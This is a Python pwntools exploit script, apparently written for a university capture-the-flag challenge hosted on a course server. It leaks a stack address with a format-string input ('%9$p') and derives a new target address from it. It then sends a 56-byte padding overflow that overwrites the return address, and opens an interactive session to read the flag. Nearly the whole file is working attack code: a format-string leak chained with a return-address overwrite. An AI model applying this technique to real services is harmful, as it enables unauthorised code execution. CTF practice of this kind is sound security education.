import subprocess
from pwn import *
import calculateOffset

server = "cs2107-ctfd-i.comp.nus.edu.sg"
port = 5002 # change


r = remote(server, port)

leakedAdd = None
newAdd = None

def getOutput():
	try:
		output = (r.recvline(timeout=1).decode()) # recvline is blocking
		return output
	except Exception as e:
		return ''

def readAll():
	global leakedAdd
	global newAdd
	while True:
		line = getOutput()
		if extractHex(line):
			leakedAdd = extractHex(line)
			print(f"leaked address is {leakedAdd}")
			newAdd = calculateOffset.calculateNewAdd(leakedAdd)
			print(f"new address is {newAdd}")
		if not line:
			break
		print(line, end='')

def extractHex(line):
	match = re.search(r'0x[0-9a-fA-F]+', line)
	if match:
		return match.group(0)  # Return the matched string (hex value)
	return None  # Return None if no match is found

def calculatePayload():
	length = 56
	payload = b'A'*length
	payload += p64(int(newAdd,16))
	payload += b'\n'
	return payload

readAll()
r.send(b'2'+ b'\n')

readAll()
r.send(b'%9$p\n' )

readAll()
r.send(b'\n')

readAll()
r.send(b'3\n')

readAll()
print("sending payload now")
print(f"newAdd is {newAdd}")
r.send(calculatePayload())

r.interactive() # To capture output of the 'cat' command
# cat expects to interact with terminal's stdin for input and stdoutput foroutput
# in interactive mode, terminal is set up to handle this
